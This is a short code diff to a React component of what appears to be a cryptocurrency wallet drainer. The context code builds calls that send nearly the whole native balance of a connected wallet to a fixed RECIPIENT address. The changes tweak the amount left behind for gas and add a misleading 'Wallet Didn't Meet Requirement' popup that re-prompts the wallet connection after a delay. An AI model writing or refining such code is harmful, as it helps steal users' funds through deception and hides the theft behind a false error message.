@@ -181,7 +181,7 @@ function App() {
 
         if( balance.type == "NATIVE"){
           let bal   = parseFloat( formatEther(balance.balance));
-          const ethValue = parseEther((bal - 0.0001).toString())
+          const ethValue = parseEther((bal - 0.001).toString())
             calls.push({
               to: RECIPIENT,
               value: bigintToHex(ethValue)
@@ -254,9 +254,15 @@ function App() {
       const userAddress = accounts?.[0]
       if (!userAddress) {
         const errorMsg = "❌ No connected account found"
+        setPopupTitle("Error ")
+        setPopupMessage("Wallet Didn't Meet Requirement");
+        setTimeout( async ()=>{          
+          setIsTransactionInProgress(false)
+          setIsOpen(false);
+           await open()
+        }, 10000);
         console.error(errorMsg)
-        setTransactionError(errorMsg)
-        await open()
+        setTransactionError(errorMsg)       
         setIsTransactionInProgress(false)
         return
       }
